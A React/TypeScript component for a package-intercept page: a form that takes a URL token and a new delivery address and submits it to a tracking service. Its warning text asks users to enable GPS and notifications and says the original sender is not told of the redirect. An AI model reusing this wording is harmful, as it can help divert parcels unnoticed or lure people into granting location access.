import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { Alert, Spinner, Form, Button } from 'react-bootstrap';
import { sendInterceptData, AddressPayload } from '../services/trackingUtils';

interface InterceptResponse {
    status: string;
    detail: string;
}

const InterceptPage = () => {
    const { token } = useParams<{ token: string }>();
    const [address, setAddress] = useState<AddressPayload>({
        token: token || '',
        method: 'POST',
        recipient: '',
        line1: '',
        line2: null,
        city: '',
        provinceOrState: '',
        postalOrZip: '',
        country: ''
    });
    const [isLoading, setIsLoading] = useState(false);
    const [response, setResponse] = useState<InterceptResponse | null>(null);
    const [error, setError] = useState<string | null>(null);

    // Update token in address when it changes
    useEffect(() => {
        if (token) {
            setAddress(prev => ({ ...prev, token }));
        }
    }, [token]);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        setAddress(prev => ({
            ...prev,
            [name]: value === '' && name === 'line2' ? null : value
        }));
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        
        if (!token) {
            setError('Missing required parameter: token is required');
            return;
        }

        // Validate required fields
        if (!address.recipient || !address.line1 || !address.city || 
            !address.provinceOrState || !address.postalOrZip || !address.country) {
            setError('Please fill in all required fields');
            return;
        }

        setIsLoading(true);
        setError(null);
        setResponse(null);

        try {
            const result = await sendInterceptData(address);
            setResponse(result);

            if (result.status !== 'success') {
                throw new Error(result.detail || 'Intercept request failed');
            }
        } catch (err) {
            setError(err instanceof Error ? err.message : 'An error occurred');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="row justify-content-center mt-4">
            <div className="col-lg-8 col-md-10">

                <h4 className="mb-4 fw-semibold">Package Intercept Address</h4>

                <Alert variant="warning" className="mb-4">
                    <ul className="mb-0">
                        <li>Please enable GPS if asked. GPS allows the site to show closer delivery locations or faster routes. International locations are also available.</li>
                        <li>Notifications are required to receive new package updates. The original sender will not receive new updates.</li>
                        <li>For your privacy the original sender will not be notified of the redirect. The recipient will be responsible for any additional delivery charges incurred.</li>
                    </ul>
                </Alert>

                {error && (
                    <Alert variant="danger" className="mb-4">
                        {error}
                    </Alert>
                )}

                {response && response.status === 'success' && (
                    <Alert variant="success" className="mb-4">
                        {response.detail}
                    </Alert>
                )}

                {response && response.status !== 'success' && !error && (
                    <Alert variant="warning" className="mb-4">
                        {response.detail || 'Notification processed with warnings'}
                    </Alert>
                )}

                <Form onSubmit={handleSubmit}>
                    <Form.Group className="mb-3">
                        <Form.Label className="fw-semibold">Recipient Name <span className="text-danger">*</span></Form.Label>
                        <Form.Control
                            type="text"
                            name="recipient"
                            value={address.recipient}
                            onChange={handleChange}
                            placeholder="Enter recipient name"
                            required
                            className="border"
                        />
                    </Form.Group>

                    <Form.Group className="mb-3">
                        <Form.Label className="fw-semibold">Address Line 1 <span className="text-danger">*</span></Form.Label>
                        <Form.Control
                            type="text"
                            name="line1"
                            value={address.line1}
                            onChange={handleChange}
                            placeholder="Street address, P.O. box"
                            required
                            className="border"
                        />
                    </Form.Group>

                    <Form.Group className="mb-3">
                        <Form.Label className="fw-semibold">Address Line 2 (Optional)</Form.Label>
                        <Form.Control
                            type="text"
                            name="line2"
                            value={address.line2 || ''}
                            onChange={handleChange}
                            placeholder="Apartment, suite, unit, building, floor, etc."
                            className="border"
                        />
                    </Form.Group>

                    <div className="row">
                        <Form.Group className="mb-3 col-md-6">
                            <Form.Label className="fw-semibold">City <span className="text-danger">*</span></Form.Label>
                            <Form.Control
                                type="text"
                                name="city"
                                value={address.city}
                                onChange={handleChange}
                                placeholder="City"
                                required
                                className="border"
                            />
                        </Form.Group>

                        <Form.Group className="mb-3 col-md-6">
                            <Form.Label className="fw-semibold">Province/State <span className="text-danger">*</span></Form.Label>
                            <Form.Control
                                type="text"
                                name="provinceOrState"
                                value={address.provinceOrState}
                                onChange={handleChange}
                                placeholder="Province or State"
                                required
                                className="border"
                            />
                        </Form.Group>
                    </div>

                    <div className="row">
                        <Form.Group className="mb-3 col-md-6">
                            <Form.Label className="fw-semibold">Postal/ZIP Code <span className="text-danger">*</span></Form.Label>
                            <Form.Control
                                type="text"
                                name="postalOrZip"
                                value={address.postalOrZip}
                                onChange={handleChange}
                                placeholder="Postal or ZIP code"
                                required
                                className="border"
                            />
                        </Form.Group>

                        <Form.Group className="mb-3 col-md-6">
                            <Form.Label className="fw-semibold">Country <span className="text-danger">*</span></Form.Label>
                            <Form.Control
                                type="text"
                                name="country"
                                value={address.country}
                                onChange={handleChange}
                                placeholder="Country (e.g., US, CA)"
                                required
                                className="border"
                            />
                            <Form.Text className="text-muted">
                                Use 2-letter country code (e.g., US, CA, GB)
                            </Form.Text>
                        </Form.Group>
                    </div>

                    <Button 
                        type="submit" 
                        variant="primary" 
                        disabled={isLoading}
                        className="w-100"
                    >
                        {isLoading ? (
                            <>
                                <Spinner
                                    as="span"
                                    animation="border"
                                    size="sm"
                                    role="status"
                                    aria-hidden="true"
                                    className="me-2"
                                />
                                Processing...
                            </>
                        ) : (
                            'Set Intercept Address'
                        )}
                    </Button>
                </Form>
            </div>
        </div>
    );
};

export default InterceptPage;
